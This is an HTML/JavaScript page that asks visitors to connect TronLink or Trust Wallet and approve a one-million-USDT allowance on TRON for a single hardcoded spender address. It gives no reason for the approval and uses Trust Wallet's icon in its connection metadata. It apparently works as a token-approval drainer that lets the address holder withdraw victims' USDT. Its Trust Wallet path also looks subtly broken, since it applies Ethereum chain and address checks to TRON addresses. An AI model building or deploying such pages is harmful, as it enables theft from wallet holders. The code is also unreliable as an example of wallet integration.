<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Approve 1,000,000 USDT on TRON</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js" defer></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: "Inter", sans-serif;
      background: linear-gradient(135deg, #0a0a0a, #1c1c1c);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(15, 15, 15, 0.95);
      border-radius: 20px;
      padding: 40px;
      max-width: 600px;
      width: 100%;
      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
      text-align: center;
      border: 1px solid #00d4ff;
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h2 {
      font-size: 32px;
      font-weight: 800;
      color: #00d4ff;
      margin-bottom: 20px;
      text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
    }
    p {
      font-size: 18px;
      color: #cccccc;
      margin-bottom: 20px;
      line-height: 1.5;
    }
    .spender-address {
      font-weight: 600;
      color: #00ff88;
      word-break: break-all;
    }
    button {
      background: linear-gradient(45deg, #00d4ff, #00ff88);
      border: none;
      border-radius: 12px;
      padding: 15px 40px;
      font-size: 18px;
      font-weight: 600;
      color: #1a1a1a;
      cursor: pointer;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin: 10px;
    }
    button:hover {
      background: linear-gradient(45deg, #00ff88, #00d4ff);
      transform: scale(1.05);
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
    }
    #loading {
      color: #00ff88;
      font-weight: 600;
      font-size: 16px;
      display: none;
      margin-top: 20px;
      animation: pulse 1.5s infinite;
    }
    @keyframes pulse {
      0% { opacity: 1; }
      50% { opacity: 0.5; }
      100% { opacity: 1; }
    }
    .status {
      margin-top: 20px;
      font-size: 16px;
      font-weight: 600;
      color: #ff4d4d;
      min-height: 25px;
    }
    @media (max-width: 480px) {
      .container {
        padding: 20px;
      }
      h2 {
        font-size: 24px;
      }
      p {
        font-size: 16px;
      }
      button {
        padding: 12px 30px;
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Approve 1,000,000 USDT on TRON</h2>
    <p>Click the button to authorize the address:<br><strong class="spender-address">TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
    <button onclick="approveUSDT('tronlink')">Authorize with TronLink</button>
    <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet</button>
    <div id="loading">Processing Transaction...</div>
    <p class="status" id="statusText"></p>
  </div>

  <script>
    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
    const spenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
    const usdtABI = [
      {
        constant: false,
        inputs: [
          { name: "_spender", type: "address" },
          { name: "_value", type: "uint256" }
        ],
        name: "approve",
        outputs: [{ name: "", type: "bool" }],
        type: "function",
        stateMutability: "nonpayable"
      }
    ];

    async function waitForTronWeb(timeout = 5000) {
      const start = Date.now();
      while (!window.tronWeb || !window.tronWeb.ready) {
        if (Date.now() - start > timeout) {
          return false;
        }
        await new Promise(resolve => setTimeout(resolve, 100));
      }
      return true;
    }

    async function setupTronNetwork(provider) {
      try {
        await provider.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: "0x2b6653dc", // TRON Mainnet
              chainName: "TRON Mainnet",
              nativeCurrency: { name: "TRON", symbol: "TRX", decimals: 6 },
              rpcUrls: ["https://api.trongrid.io"],
              blockExplorerUrls: ["https://tronscan.org"]
            }
          ]
        });
      } catch (error) {
        throw new Error(`Failed to setup TRON network: ${error.message}`);
      }
    }

    async function connectTrustWallet() {
      try {
        let provider;
        if (window.ethereum && window.ethereum.isTrust) {
          provider = new ethers.providers.Web3Provider(window.ethereum);
          await window.ethereum.request({ method: "eth_requestAccounts" });
        } else {
          provider = await EthereumProvider.init({
            projectId: "f6b400b4393b83bb22abcaf805ad72d2", // Replace with your WalletConnect project ID
            chains: [728126428], // TRON Mainnet chain ID
            rpc: { 728126428: "https://api.trongrid.io" },
            metadata: {
              name: "USDT Approval",
              description: "Approve USDT on TRON",
              url: window.location.href,
              icons: ["https://trustwallet.com/assets/images/favicon.png"]
            },
            showQrModal: true
          });
          await provider.connect();
          provider = new ethers.providers.Web3Provider(provider);
        }
        await setupTronNetwork(provider);
        return provider;
      } catch (error) {
        throw new Error(`Failed to connect Trust Wallet: ${error.message}`);
      }
    }

    async function approveUSDT(walletType) {
      const loadingDiv = document.getElementById("loading");
      const statusText = document.getElementById("statusText");

      try {
        loadingDiv.style.display = "block";
        statusText.textContent = "";

        // Set approval amount: 1,000,000 USDT (6 decimals)
        let amount;
        if (typeof ethers !== "undefined" && ethers.utils) {
          amount = ethers.utils.parseUnits("1000000", 6).toString();
        } else {
          amount = "1000000000000"; // 1,000,000 * 10^6
        }

        if (walletType === "tronlink") {
          // TronLink approval
          const tronWebReady = await waitForTronWeb();
          if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
            statusText.textContent = "Please install TronLink and log in to your wallet.";
            loadingDiv.style.display = "none";
            return;
          }

          if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
            statusText.textContent = "Please connect to the TRON Mainnet.";
            loadingDiv.style.display = "none";
            return;
          }

          if (!window.tronWeb.isAddress(spenderAddress)) {
            statusText.textContent = "Invalid spender address!";
            loadingDiv.style.display = "none";
            return;
          }

          const contract = await window.tronWeb.contract(usdtABI, usdtContractAddress);

          if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
            statusText.textContent = "Approval cancelled.";
            loadingDiv.style.display = "none";
            return;
          }

          statusText.textContent = "Sending approval transaction with TronLink...";
          const tx = await contract.approve(spenderAddress, amount).send({
            feeLimit: 30000000, // 30 TRX
            callValue: 0,
            shouldPollResponse: false
          });

          statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
        } else if (walletType === "trustwallet") {
          // Trust Wallet approval
          const provider = await connectTrustWallet();
          const signer = provider.getSigner();

          if (!ethers.utils.isAddress(spenderAddress)) {
            statusText.textContent = "Invalid spender address!";
            loadingDiv.style.display = "none";
            return;
          }

          const contract = new ethers.Contract(usdtContractAddress, usdtABI, signer);

          if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?`)) {
            statusText.textContent = "Approval cancelled.";
            loadingDiv.style.display = "none";
            return;
          }

          statusText.textContent = "Sending approval transaction with Trust Wallet...";
          const tx = await contract.approve(spenderAddress, amount, { gasLimit: 100000 });
          const receipt = await tx.wait();

          statusText.textContent = `✅ Approval successful! Transaction Hash: ${receipt.transactionHash}`;
        }

        loadingDiv.style.display = "none";
      } catch (error) {
        console.error("Transaction error:", error);
        statusText.textContent = `Approval failed: ${error.message || error}`;
        loadingDiv.style.display = "none";
      }
    }
  </script>
</body>
</html>
